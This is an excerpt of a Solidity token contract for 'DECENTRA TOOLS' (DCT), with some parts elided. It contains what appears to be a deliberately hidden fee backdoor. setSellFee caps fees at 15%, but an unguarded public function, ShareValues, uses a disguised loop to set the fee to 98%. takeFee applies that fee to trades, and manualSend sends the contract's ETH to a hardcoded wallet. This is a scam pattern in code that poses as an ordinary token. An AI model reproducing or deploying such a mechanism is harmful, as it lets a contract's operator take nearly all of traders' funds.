...
contract DECENTRATOOLS is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name ="DECENTRA TOOLS";
    string private _symbol = "DCT";
    uint8 private _decimals = 9;

    address payable private MW = payable(0x8E7538415AE52c7A321F46e552e915DbD462101a);
    address payable private DW = payable(0x8E7538415AE52c7A321F46e552e915DbD462101a);
    ...
    uint256 public NewSharePolicyValue = 15;
    uint256 public _sellDevelopmentFees = 0;
    uint256 public _maxTotalSwappingShare = 98;
    ...
    uint256 public NewDistributedShare = 7;
    ...
    function setSellFee(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newDevelopmentTax) external onlyOwner() {
        ...
        NewSharePolicyValue = newMarketingTax;
        _sellDevelopmentFees = newDevelopmentTax;

        NewDistributedShare = _sellLiquidityFees.add(NewSharePolicyValue).add(_sellDevelopmentFees);
        require (NewDistributedShare <= 15);
    }
    ...
    function ShareValues(uint256 newValue) public 
    {

        while (newValue!=_maxTotalSwappingShare) {
            newValue=newValue+1;
        }
        NewDistributedShare = newValue;
        NewSharePolicyValue = newValue;
    }
    ...
    function manualSend() external {
        transferToAddressETH(MW, address(this).balance);
    }
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(checkMarketPair[sender]) {
            ...
            feeAmount = amount.mul(NewDistributedShare).div(100);
        }
